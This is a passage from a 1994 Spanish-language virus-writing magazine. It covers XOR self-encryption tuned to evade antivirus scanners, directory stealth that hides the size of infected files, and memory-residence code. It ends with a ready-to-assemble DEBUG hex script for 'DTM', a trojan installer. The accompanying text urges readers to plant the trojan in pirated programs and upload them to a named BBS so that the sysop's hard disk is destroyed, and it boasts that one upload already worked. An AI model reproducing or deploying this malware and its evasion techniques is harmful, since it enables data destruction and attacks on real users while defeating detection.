
;             etc....etc....etc

;******************************************************************
;mueve desde l1 hasta l2 al final del codigo
;esta parte en un virus seria la parte de reproduccion y devolucion
;del control al programa anfitrion
;esto lo realizamos para tratar de encriptar la mayor parte posible de codigo.


              cld
              lea si, l1 + bp
              lea di, dos + bp
              lea cx, l2
              lea ax, l1
              sub cx,ax
              sar cx, 1
              inc cx
              rep movsw

;*******************************************************************
              call rand        ;obtiene un numero aleatorio de 16 bits
                               ;para usarlo como nueva llave
              mov word ptr [xorkey+bp],dx
;********************************************************************

              jmp dos
l1:
;encuentra el offset en donde a quedado la rutina encr_desc
;almacena en called para luego llamar a esta rutina via memoria.

              lea ax, rutina + bp
              mov [called + bp], ax
      
              mov ax,3d02h                  ;habre el file prueba1.com
              lea dx,file+bp                ;modo lectura escritura
              int 21h                       ;debuelve file handle en ax
              mov [handle + bp], ax

              mov bx, [handle + bp]
              lea cx,dos+bp                 ;calcula y guarda en cx la
              lea ax,uno+bp                 ;longitud en bytes de este programa
              sub cx,ax
            
              lea dx,uno+bp              ;buffer comienza en ds:uno  
            
              push bx
              push cx
              push dx

              call [called+bp]           ;encripta con la nueva llave
            
              pop dx
              pop cx
              pop bx

              mov ax,4000h
              int 21h                    ;se sobreescribe este programa

            
              mov ax,3e00h               ;cierra el file prueba1.com
              int 21h

              mov ah,4ch                 ;vuelve al dos
              int 21h
l2:

;**********************************************************************
rand proc
;genera una nueva llave aleatoria leyendo el reloj (minutos y segundos)
;resultado en dx    
              mov ah,2ch
              int 21h
              ret
rand endp
;**********************************************************************

saludo   db  "Minotauro$"
file     db  "prueba2.com",0
handle   dw   1 dup (?)

endmark:      nop
              nop
;la encriptacion termina en endmark y debido a que trabajamos con word
;y en el calculo nos puede dar que el ultimo word a encriptar comienze
;en direccion de handle+1 ponemos un dos para que si sucede esto encripte
;inutilmente al nop y no a la parte baja de xorkey la cual debe quedar
;desencriptada.  
;Se podria haber colocado endmark antes de handle y sacar los nop.  


xorkey       dw 1 dup (0)                ;word donde se guarda la llave
called       dw 1 dup (0)

;********************rutina de encriptacion y desencriptacion*************
rutina:
;esta etiqueta (rutina) esta por el echo de que cuando llamamos a la
;rutina para encriptar lo hacemos desde el codigo que hemos desplazado
;en memoria y si hacemos un call encr;pues la rutina encr;calculado en tiempo de compilacion,
;por lo tanto llamamos a la rutina via memoria y para saber
;donde a quedado usamos la etiqueta rutina.

encr_desc    proc
             lea bx, mark + bp
             lea dx, endmark + bp
             mov cx, dx
             sub cx,bx
             sar cx, 1
             inc cx
             mov dx, [xorkey + bp]
xorloop:     xor [bx],dx           ;bx puntero de word a criptar o descriptar
             add bx,02             ;dx la llave
             loop xorloop
             ret
encr_desc    endp
;***************************************************************************
dos:
programa endp
code ends
end           programa
;____________________________corte aqui__________________________________

Bien ahora usted observa que en cada corrida del programa pocas son las
partes del mismo que permanece constantes exactamente estas partes son:
****************************************************************************
              CALL falso
falso proc
falso endp
              pop bp
              sub bp,0103h

Esta parte no nos traer problema en primera instancia ya que son pocos bytes.
En todo caso podemos usar un truco que veremos luego.
 
****************************************************************************

xorkey       dw 1 dup (0)                ;word donde se guarda la llave
called       dw 1 dup (0)

No problema pues xorkey es distinta en cada reproduccion.

****************************************************************************
encr_desc    proc
             lea bx, mark + bp
             lea dx, endmark + bp
             mov cx, dx
             sub cx,bx
             sar cx, 1
             inc cx
             mov dx,[xorkey + bp]
xorloop:     xor [bx],dx           ;bx puntero de word a criptar o descriptar
             add bx,02             ;dx la llave
             loop xorloop
             ret
encr_desc    endp

Esta seria la parte mas extensa de codigo que queda sin encriptar , y por lo
tanto el eslabon mas debil del sistema .
Para eliminar esto supongamos que aaaa ..... cccc sean numeros aleatorios
de 16 bits generados de la misma manera que xorkey y transformamos nuestra
rutina de la siguiente manera.

encr_desc    proc
             lea bx, mark + bp
antiscan:
             add bx,aaaa------>agregado
             sub bx,aaaa------>agregado

             lea dx, endmark + bp
             mov cx, dx
             sub cx,bx

             add cx,bbbb ------>agregado
             sub cx,bbbb ------>agregado

             sar cx, 1
             inc cx
             mov dx, [xorkey + bp]
xorloop:     xor [bx],dx           ;bx puntero de word a criptar o descriptar
             add bx,02             ;dx la llave
             
             add bx,cccc------>agregado
             sub bx,cccc------>agregado

             loop xorloop
             ret
encr_desc    endp

Observese que al sumar y al restar una misma cantidad el contenido del
registro no cambia , pero si el codigo generado.
Con esto logramos que el string que se pueda llegar a dejar constante en
cada reproduccion sea de menor longitud.

Como se haria esto .... simple antes de reproducir generariamos los numeros
aaaa.....cccc y los colocariamos en la rutina.
******************************************************************************
Veamos el programa con esta modificacion.
-----------------------------------------

;____________________________corte aqui____________________________________
;compilarlo con nombre prueba3.com

code segment
              org 0100h
              assume cs:code,ds:code
programa      proc far
uno:
              call falso
falso         proc
falso         endp     
              pop bp
              sub bp,0103h
              call encr_desc
mark:
start:
              lea dx, saludo + bp
              mov ah,09h
              int 21h                    ;imprime Minotauro
;             etc....etc....etc
              cld
              lea si, l1 + bp
              lea di, dos + bp
              lea cx, l2
              lea ax, l1
              sub cx,ax
              sar cx, 1
              inc cx
              rep movsw
              call rand        ;obtiene un numero aleatorio de 16 bits
                               ;para usarlo como nueva llave
              mov word ptr [xorkey+bp],dx
;********************************************************************
;agregado para variar la rutina de encriptamiento

              lea di,antiscan+bp        ;puntero en di
              call rand                 ;alla aaaa
              mov [di+bp+2],dx          ;coloca aaaaa
              mov [di+bp+6],dx          ;coloca aaaa
              call rand                 ;alla bbbb
              mov [di+bp+18],dx         ;coloca bbbb
              mov [di+bp+22],dx         ;coloca bbbb
              call rand                 ;alla cccc
              mov [di+bp+39],dx         ;coloca cccc
              mov [di+bp+43],dx         ;coloca cccc



              jmp dos
l1: 
              lea ax, rutina + bp
              mov [called + bp], ax
              mov ax,3d02h                  ;habre el file prueba1.com
              lea dx,file+bp                ;modo lectura escritura
              int 21h                       ;debuelve file handle en ax
              mov [handle + bp], ax
              mov bx, [handle + bp]
              lea cx,dos+bp                 ;calcula y guarda en cx la
              lea ax,uno+bp                 ;longitud en bytes de este programa
              sub cx,ax
              lea dx,uno+bp              ;buffer comienza en ds:uno   
              push bx
              push cx
              push dx
              call [called+bp]           ;encripta con la nueva llave
              pop dx
              pop cx
              pop bx
              mov ax,4000h
              int 21h                    ;se sobreescribe este programa
              mov ax,3e00h               ;cierra el file prueba1.com
              int 21h
              mov ah,4ch                 ;vuelve al dos
              int 21h
l2:
rand proc
              mov ah,2ch
              int 21h
              ret
rand endp
saludo   db  "Minotauro$"
file     db  "prueba3.com",0
handle   dw   1 dup (?)
endmark:      nop
              nop
xorkey       dw 1 dup (0)                ;word donde se guarda la llave
called       dw 1 dup (0)
rutina:
encr_desc    proc
             lea bx,mark+bp
antiscan:
             add bx,1111h
             sub bx,1111h
             lea dx, endmark + bp
             mov cx, dx
             sub cx,bx
             add cx,2222h
             sub cx,2222h
             sar cx, 1
             inc cx
             mov dx, [xorkey + bp]
xorloop:     xor [bx],dx           ;bx puntero de word a criptar o descriptar
             add bx,02             ;dx la llave
             add bx,3333h
             sub bx,3333h
             loop xorloop
             ret
encr_desc    enp
dos:
programa endp
code ends
end           programa
;_______________________corte aqui___________________________________


Bien ahora la rutina encr_desc ligeramente  cambia entre reproducion y
reproduccion.
?es esto la solucion final?
No pues aunque se la hemos complicado a los anti todavia una vez estudiado
el codigo los scaners podran usar comodines .
Eso si les costara mas trabajo he he he...
Bueno por algo se desarrollo la mutacion !!!!!.
Creo para el metodo de xor ya basta lo explicado.
Como veran la rutina de encriptacion no debe por que ser igual a la 
de desencriptacion solo basta con que la segunda desaga los cambios
producidos por la primera.
Por ejemplo se podra encriptar sumando un numero y desencriptar restando,
o rotando x veces cada byte a la derecha y desencriptar rotando a la 
izquierda, o etc , etc , o una mezcla de todos.
Bueno por esta vez basta que les aproveche y dudas al bbs. 

Bye:LAPIDARIO.
Stealth de Directorio (FCB)
-------------------------------------------------------------------------------

Hoy en d¡a, para que un virus pueda considerase efectivo, tiene que tener
por lo menos, alguna t‚cnica stealth.
El stealth de memoria, es algo ya obvio e infaltable en un virus, en este
art¡culo discutiremos otro metodo de stealth, que es muy simple y corto al
llevarlo a la pr ctica.

Un problema en estos tiempos, es que los usuarios ya estan avisados de la
presencia de los virus, y hay mucha mas informaci¢n al respecto que cuando
aparecieron los primer virus, y todos estaban asombrados, e imagin ndose
bichitos meti‚ndose en la PC.

Cuando algun usuario ve que sus archivos comienzan a crecer de tama¤o sin
ninguna aparente raz¢n, saben que algo raro esta pasando y que eso 'raro'
es seguramente un virus.

Para evitar esto, es que se desarroll¢ la tecnica que describimos en este
art¡culo. Esta t‚cnica es la de Directory Stealth (Stealth de directorio).
Esta t‚cnica se usa para que cuando el Usuario tipee DIR, el aumento que
produce el virus en el tama¤o de los files, al infectar estos, no sea
notado.

Cuando el usuario tipea DIR son llamadas las funciones del DOS 11h y 12h.
Lo que haremos, es interceptar estas llamadas desde nuestro handler de
la int 21h.

Antes de seguir, tenemos que hablar del FCB (File control Block). El FCB
es una tabla que usa el DOS para trabajar con los archivos, abrirlos,
cerrarlos, etc etc. Hay 2 tipos de FCB, una es la NORMAL..

El formato de la misma es el siguiente:

offset   Size      Descripci¢n
------------------------------------------------------------------------------
00h       1        Drive (00=actual, 01=A:, 02=B:, 03=C: etc.)
01h       8        Nombre del File. Si < 8 caracteres, se llena con espacios.
09h       3        Extensi¢n del File.
0Ch       2        Bloque actual. Apunta al bloque de registros.
0Eh       2        Tama¤o del registro.
10h       4        Tama¤o del File en bytes
14h       2        Fecha
16h       2        Hora
18h       4        Reservado ( o sea que MS no dice para que sirve :))
1Ch       4        Igual que el offset 10h, pero este valor es el impreso.
20h       1        Offset del registro actual.
21h       4        Registro relativo.

Tambi‚n existe el FCB EXTENDIDO, que es igual que el FCB normal solamente
que tiene 7 bytes mas que se agregan al principio (antes del offset 0h del
FCB NORMAL).

Offset  Size       Descripci¢n
------------------------------------------------------------------------------
-07h     1         contiene el valor 0FFh, que indica que el FCB es EXTENDIDO.
-06h     5         Reservado
-01h     1         Byte Atributo


Cuando se pide el DIR, se ejecutan las funciones 11h y 12h de la int 21h
y se hace la busqueda de los archivos con el contenido del FCB.
Si la funcion termina satisfactoriamente, el contenido del FCB es copiado
en el actual DTA.

Lo que vamos a hacer, es editar esos datos que se copian al DTA.


Primero, agregamos el codigo para interceptar a las funciones 11h y 12h en
nuestro handler de la int 21h:

Handler_21:
           ..
           ..
           cmp ah,11h           ; el usuario pidi¢ dir?
           je D_stealth         ; hacemos el stealth
           cmp ah,12h           ; el usuario pidi¢ dir?
           je D_stealth         ; hacemos el stealth
           ..
           ..

Ahora vayamos directo al codigo que hace el stealth propiamente dicho.
primero, llamamos a la int 21h original, para que nos llene el DTA con
los datos del FILE..

D_Stealth:
          pushf                          ; simulamos un
          call dword ptr cs:[Old21]      ; int 21h
          or al,al                       ; si AL=0 todo salio OK.
          jnz ERROR                      ; ag, ha ocurrido un error.. ;)


lo que haremos a continuaci¢n es obtener la direcci¢n del DTA para poder
modificar los datos del mismo..

          push ax bx es                  ; guardamos los registros que usamos

          mov ah,2fh                     ; Nos devuelve en
          int 21h                        ; ES:BX -> direcci¢n del DTA


Ahora, tenemos que verificar que clase de FCB es, si EXTENDIDO o NORMAL, ya
que los offsets seran diferentes, para eso nos fijamos si el primer byte
del FCB es 0FFH, si es asi, estamos ante un FCB EXTENDIDO, sino ante uno
NORMAL. :).
Si se trata del EXTENDIDO le agregamos 7 bytes a la direcci¢n del mismo,
por los 7 bytes de mas que tiene este, y sobrepasamos estos que no nos
sirven y quedamos apuntando al primer dato que los dos tienen en com£n.


         cmp byte ptr es:[BX],0ffh      ; el primer byte es FF?
         jne normal                     ; no, es FCB NORMAL
         add bx,7h                      ; Es EXTENDIDA, le sumamos 7 bytes

a continuaci¢n, tenemos que verificar si el archivo esta infectado, ya que
sino no nos interesa arreglarle nada. Para esto suponemos que para marcar
a los files ya infectados, lo hacemos poniendo los segundos de la hora del
file a 60 seg, valor imposible.

normal: mov ax,es:[bx+17h]              ; tomamos la hora del file del FCB
        and ax,1fh                      ; desenmascaramos los segundos.
        xor al,1eh                      ; son 60 segundos!?.
                                        ; 1eh = 30 decimal, 30*2 = 60 seg.
                                        ; XOR = CMP, pero mas rapido y corto
        jne no_infectado                ; no son 60, no esta infectado..

El codigo que sigue se ejecutar  entonces si, y solo si :), el file esta
infectado, lo que hacemos es restarle al filesize que esta en 1Ch el
tama¤o del virus, asi obtendremos el tama¤o original del file..

        sub word ptr es:[bx+1dh],VIRLEN   ; le restamos el tama¤o del virus.
        sbb word ptr es:[bx+1fh],0        ; por si nos da resto

Listo!, a continuaci¢n restauramos los registros que usamos y volvemos de la
int.

no_infectado: pop es bx ax              ; restauramos registros
error:        iret                      ; volvemos..

Ya esta, realmente es algo f cil, y digno de incluirse en un virus, el tama¤o
del codigo es despreciable, y sus servicios son realmente £tiles..

	Esta es una forma de Directory Stealth, que es usando el FCB, que es el
que usa el DOS al hacer el DIR, pero tambien existe otro stealth, que es por
HANDLE, que es el sistema usado por el Norton Commander, Pctools y programas
parecidos, para mostrar los files, ya que su manejo es mucha mas facil que por
FCB. En un pr¢ximo articulo trataremos este metodo, que es practicamente igual.

                                                            -  WM’  -
F‚ de Ratas.. ;)
-------------------------------------------------------------------------------
	Jeje, esta area esta destinada a 'corregir' o aclarar un poco mas los
conceptos de los que se hablan en la revista.. generalmente de n£meros anterio_
res, ;). El problema era la velocidad de edicion de la revista: Tenemos a un
grupo de gente laburando en varios proyectos a la vez, adem s de la revista y
algunas cosas pasan desapercibidas.. o no nos damos cuenta que no estan lo su_
ficientemente claras como para entenderlas.

	Un ejempo de esto es la nota en que Zarathustra habla de los m‚todos de
residencia... en la parte que explica el m‚todo de MCB, nos dice:

	mov	ax, cs			;Con esto obtenemos el segmento
	dec	ax			;del MCB.

	mov	es, ax			;Aca estamos obteniendo del campo
	mov	ax, es:[3]		;del MCB, la memoria utilizada.

;******************************************************************************
;El problema de esto, es que en nignun momento se aclara que tenemos que decla_
;rar el tama¤o del virus un poco mas grande, exactamente un parrafo mas largo.
;Esto por qu‚ ? Y bueno, en el momento en que tenemos que restarle un parrafo a
;la memoria que queremos reservar (esto lo haciamos para dar lugar a que se
;cree el MCB del nuevo bloque), estamos reservando un parrafo menos de virus
;tambien.. osea que la ultima parte del virus no entraria en la memoria reser_
;vada.. Puede ser que no traiga problemas por ser un  rea de datos o algo por
;el estilo, pero es aconsejable hacer las cosas bien, o no ? ;-)
;Bueno, la manera de solucionar esto es simplemente INCrementar la cantidad de
;parrafos del virus o si lo declaran en su programa con un :
;
; TAMANO_EN_PARRAFOS EQU ((FIN-COMIENZO)/16)+1
;
; declarar el incremento directamente ahi, para no gastar bytes ni clocks ;) :
;
; TAMANO_EN_PARRAFOS EQU ((FIN-COMIENZO+15)/16)+1
;
;******************************************************************************

	sub	ax, bx			;En BX esta la longitud del virus,
					;en parrafos. (ahora incrementada).

	push	bx			;Salvo la cantidad de mem a reservar.
	mov	bx, ax			;Le paso la nueva cantidad a BX.
	push	cs 
	pop	es
	mov	ah, 4ah
	int	21h

	pop	bx			;Popeo la  cantidad de mem a reservar.
	dec	bx
	mov	ah, 48h
	int	21h

	dec	ax
	mov	es, ax
	mov	word ptr es:[1], 8
	mov	word ptr es:[8],'XX'	;Opcional, un nombre al bloque.
	inc	ax
	mov	es, ax

	push	es			;Salvo la dir del seg. del virus
	...				;blah blah blah y sigue el c¢digo ;)
	...DTM - Dead to Minotauro BBS silly Troyan installer.
-------------------------------------------------------------------------------

Bueno, este es un peque¤o programa que hice para erradicar una molestia que
tiene la revista llamada 'Minotauro BBS'.

Este autoproclamado BBS (no llega a serlo, es cualquier cosa) ha sido motivo
de varias equivocaciones por parte de los lectores de nuestra revista, que
por logica lo asocian con la misma (por si no se dieron cuenta, esto que estan
leyendo es una revista, y se llama Minotauro Magazine, ¨entienden la
relacion?.. ;)).

Pues le hemos pedido en varias ocasiones (¨hemos? ;)) que cambie el nombre
de su sistema, pero el sysop no hace caso, ya que es un 'WareZ D00dz' :0.

Pues bien, ESTE BBS NO TIENE NADA, repito.., NADA QUE VER CON MINOTAURO
MAGAZINE. Lamentablemente como el Sysop no entiende razones, sacamos este
programa para el publico lector de nuestra revista.

El programa en cuestion es el DTM, Dead to Minotauro BBs silly troyan insta-
ller ;).

El programa instalar  un troyano en cualquier archivo .EXE que uno quiera.

La idea es que uds. nos ayuden, tomen cualquier '0-0 Warez' ;), y le agreguen
al .EXE del mismo el troyano. y lo suban a Minotauro BBS, para que esa pobre
cosa amorfa llamada Sysop, lo ejecute entusiasmado y vea como su Hd se hace
, en una palabra, MIERDA. Esto por mas tonto que parezca, es muy factible,
porque el Sysop del BBs no es muy 'brillante' que digamos, por no decir que
es totalmente estupido ;).


El programa se los suministramos en un Script del debug, para convertir el
mismo a un archivo .COM ejecutable, tienen que hacer lo siguiente:

  o Eliminar Todo el Texto que se encuentra antes y despues de las lineas
    que dicen 'Cortar Aqu¡', incluyendo estas lineas tambi‚n.
    De esta manera les quedar  un archivo, SOLO con el script del debug.

  o a continuaci¢n tipeen: DEBUG < DEBUG.SCR
    donde DEBUG.SCR es el archivo que crearon anteriormente.

  o Listo!.

Si hicieron todo correctamente se creara un archivo llamado DTM.COM.
El uso del mismo es MUY sencillo, basta ejecutarlo, y solo tienen que poner
el nombre del EXE al que le quieren poner el troyano y listo!.


Si quieren usar DTM para joder a otros BBS o a cualquiera, solo les advierto
que el mensaje que pone al trashear el HD no va a estar muy acorde con su
intenci¢n, ya que el mismo fue hecho ESPECIALMENTE para Minotauro BBS.
Pero pueden cambiarle el texto del mensaje con un editor como el Norton
Editor (muy 'Lame', como dicen los 'Warez D00dz' :0 ;) )

Tampoco empiezen a tirarle troyanos al Todo el mundo, me parece algo idiota
de su parte, pero si tienen alguna BUENA razon, vayan a por ello :)

Bueno, esperamos que suban muchos troyanos a Minotauro BBS, y le rompan
el HD cada 2 x 3, asi aprende de una vez.


NOTA: Un troyano ya fu‚ subido a Minotauro BBS (no voy a decir por quien ;))
y al parecer hizo efecto :). ya que me han comentado que el BBS no responde
mas. :)

igualmente, no se desanimen!. ;)

                                             Por WM’
                                - el Mundo sigue girando por inercia -

-- Cortar aqu¡ -------------------------------------------------------------
N DTM.COM
E 0100 E9 D7 04 C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4
E 0110 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4
E 0120 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4
E 0130 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4
E 0140 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4
E 0150 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4
E 0160 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4
E 0170 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4
E 0180 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4
E 0190 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4
E 01A0 0F C4 0F 20 0F 20 0F DA 07 CB 07 CB 07 CD 0F CD
E 01B0 0F CB 0F BF 0F 20 0F DA 07 CD 07 D1 07 CB 0F D1
E 01C0 0F CD 0F BF 0F 20 0F DA 07 CB 07 CD 07 CB 0F CD
E 01D0 0F CB 0F BF 0F 20 0F 20 0F 20 0F 44 0F 65 0F 61
E 01E0 0F 64 0F 20 0F 54 0F 6F 0F 20 0F 4D 0F 69 0F 6E
E 01F0 0F 6F 0F 54 0F 61 0F 75 0F 72 0F 6F 0F 20 0F 42
E 0200 0F 42 0F 53 0F 20 0F 53 0F 69 0F 6C 0F 6C 0F 79
E 0210 0F 20 0F 54 0F 72 0F 6F 0F 79 0F 61 0F 6E 0F 20
E 0220 0F 49 0F 6E 0F 73 0F 74 0F 41 0F 6C 0F 6C 0F 65
E 0230 0F 72 0F 2E 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20
E 0240 0F 20 0F 20 0F 20 0F B3 03 BA 03 BA 03 20 03 20
E 0250 03 BA 0B B3 0B 20 0B 20 0B 20 0B B3 03 BA 0B B3
E 0260 0B 20 0B 20 0B 20 0B B3 03 BA 03 20 03 BA 0B 20
E 0270 0B BA 0B B3 0B 20 0B 20 0B 20 0B 28 0F 63 0F 29
E 0280 0F 20 0F 31 0F 39 0F 39 0F 34 0F 2C 0F 20 0F 62
E 0290 0F 79 0F 20 0F 57 0F 4D 0F 92 0F 20 0F 20 0F 20
E 02A0 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20
E 02B0 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20
E 02C0 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20
E 02D0 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20
E 02E0 0F 20 0F C4 0F 20 0F C0 01 CA 01 CA 01 CD 09 CD
E 02F0 09 CA 09 D9 09 20 09 20 09 20 09 CF 01 CA 09 CF
E 0300 09 20 09 20 09 20 09 C0 01 CA 01 20 01 20 01 20
E 0310 01 CA 09 D9 09 20 09 C4 0F C4 0F C4 0F C4 0F C4
E 0320 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4
E 0330 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4
E 0340 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4
E 0350 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4
E 0360 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4
E 0370 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4 0F C4
E 0380 0F C4 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20
E 0390 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20
E 03A0 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20
E 03B0 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20
E 03C0 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20
E 03D0 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20
E 03E0 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20
E 03F0 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20
E 0400 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20
E 0410 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20 0F 20
E 0420 0F 20 0F 44 65 61 64 20 74 6F 20 4D 69 6E 6F 54
E 0430 61 75 72 6F 20 42 42 53 20 53 69 6C 6C 79 20 54
E 0440 72 6F 79 61 6E 20 49 6E 73 74 61 6C 6C 65 72 2E
E 0450 20 28 63 29 20 31 39 39 34 2C 20 62 79 20 57 4D
E 0460 92 0D 0A AD 4E 61 64 61 20 71 75 65 20 76 65 72
E 0470 20 63 6F 6E 20 4D 69 6E 6F 74 61 75 72 6F 20 4D
E 0480 61 67 61 7A 69 6E 65 21 2E 0D 0A 24 0D 0A FE 20
E 0490 41 72 63 68 69 76 6F 3A 20 24 0D 0A FE 20 45 72
E 04A0 72 6F 72 20 61 6C 20 41 62 72 69 72 20 46 69 6C
E 04B0 65 21 07 0D 0A 24 0D 0A FE 20 46 69 6C 65 20 41
E 04C0 62 69 65 72 74 6F 20 4F 6B 21 2E 2E 24 0D 0A FE
E 04D0 20 45 72 72 6F 72 21 2C 20 4E 6F 20 73 65 20 70
E 04E0 75 64 6F 20 6C 65 65 72 20 48 65 61 64 65 72 20
E 04F0 6F 20 4E 6F 20 65 73 20 75 6E 20 45 58 45 21 07
E 0500 0D 0A 24 0D 0A FE 20 48 65 61 64 65 72 20 64 65
E 0510 6C 20 45 78 65 20 6C 65 A1 64 6F 20 4F 6B 21 2E
E 0520 2E 24 0D 0A FE 20 45 72 72 6F 72 20 61 6C 20 49
E 0530 6E 73 74 61 6C 61 72 20 54 72 6F 79 61 6E 6F 21
E 0540 2E 07 0D 0A 24 0D 0A FE 20 54 72 6F 79 61 6E 6F
E 0550 20 49 6E 73 74 61 6C 61 64 6F 20 43 6F 72 72 65
E 0560 63 74 61 6D 65 6E 74 65 21 2E 0D 0A 24 0D 0A FE
E 0570 20 45 72 72 6F 72 20 61 6C 20 43 61 6D 62 69 61
E 0580 72 20 48 65 61 64 65 72 21 2E 07 0D 0A 24 0D 0A
E 0590 FE 20 48 65 61 64 65 72 20 4D 6F 64 69 66 69 63
E 05A0 61 64 6F 20 4F 4B 21 2E 0D 0A 24 0D 00 00 00 00
E 05B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
E 05C0 00 00 00 00 00 00 00 00 00 00 DA 08 00 00 5A 07
E 05D0 00 00 00 00 00 00 00 00 00 00 E8 5A 01 E8 68 01
E 05E0 B4 02 BA 00 05 CD 10 BA 23 04 E8 45 01 BA 8C 04
E 05F0 E8 3F 01 B4 0A BA AB 05 CD 21 2E 80 3E AD 05 20
E 0600 74 0B 2E 80 3E AD 05 0D 74 03 EB 06 90 E8 27 01
E 0610 EB C8 33 C0 2E A0 AC 05 BE AD 05 03 F0 33 C0 8B
E 0620 FE AA E8 0B 00 E8 23 00 E8 65 00 B8 00 4C CD 21
E 0630 B8 02 3D BA AD 05 CD 21 72 09 8B D8 BA B6 04 E8
E 0640 F0 00 C3 BA 9A 04 E8 E9 00 EB E0 B4 3F B9 20 00
E 0650 BA BA 05 CD 21 72 10 2E 81 3E BA 05 4D 5A 75 07
E 0660 BA 03 05 E8 CC 00 C3 B4 3E CD 21 BA CD 04 E8 C1
E 0670 00 EB B8 B4 40 B9 80 00 90 BA 5A 07 CD 21 72 01
E 0680 C3 5A 58 59 B4 3E CD 21 BA 22 05 E8 A4 00 EB 9B
E 0690 B8 02 42 33 C9 33 D2 CD 21 73 03 E9 87 00 25 0F
E 06A0 00 0B C0 74 09 B9 10 00 2B C8 B4 40 CD 21 B8 02
E 06B0 42 33 C9 33 D2 CD 21 72 6C B1 04 D3 E8 B1 0C D3
E 06C0 E2 03 D0 2E 2B 16 C2 05 52 E8 A7 FF 5A 2E 89 16
E 06D0 C8 05 2E 89 16 D0 05 2E C7 06 CE 05 00 00 2E C7
E 06E0 06 CA 05 80 01 B8 02 42 33 C9 33 D2 CD 21 72 35
E 06F0 B9 00 02 F7 F1 40 2E 89 16 BC 05 2E A3 BE 05 B8
E 0700 00 42 33 C9 33 D2 CD 21 72 1B B4 40 B9 20 00 BA
E 0710 BA 05 CD 21 B4 3E CD 21 BA 8E 05 E8 14 00 BA 45
E 0720 05 E8 0E 00 C3 B4 3E CD 21 BA 6D 05 E8 03 00 E9
E 0730 F9 FE B4 09 CD 21 C3 B8 00 B8 8E C0 33 C0 33 FF
E 0740 B9 D0 07 F3 AB 0E 07 C3 B8 00 B8 8E C0 33 FF BE
E 0750 03 01 B9 20 03 F3 A4 0E 07 C3 E8 00 00 CC 5D 81
E 0760 ED 5D 07 BB 87 07 B5 00 B4 04 FE C4 BA 80 00 CD
E 0770 13 FE C5 80 FD 99 75 F0 0E 1F B4 09 8D 96 87 07
E 0780 CD 21 B8 00 4C CD 21 9D ED 75 20 68 E0 76 EE 20
E 0790 62 EE EE EF 20 E7 ED 6C 64 21 2E 20 53 ED 6C ED
E 07A0 20 68 E0 9D 20 55 EF 20 4D 69 EF ED E7 E0 75 72
E 07B0 ED 2E 2E 2E 0D 0A 9D 20 EF ED 20 EE 73 20 EE 73
E 07C0 E7 EE 2E 2E 2E 20 4A EE 6A EE 21 2E 2E 2E 20 E1
E 07D0 9D EE E1 9D EE 21 2E 0D 0A 24
RCX
06DA
W
Q
-- Cortar Aqu¡ ----------------------------------------------------------------
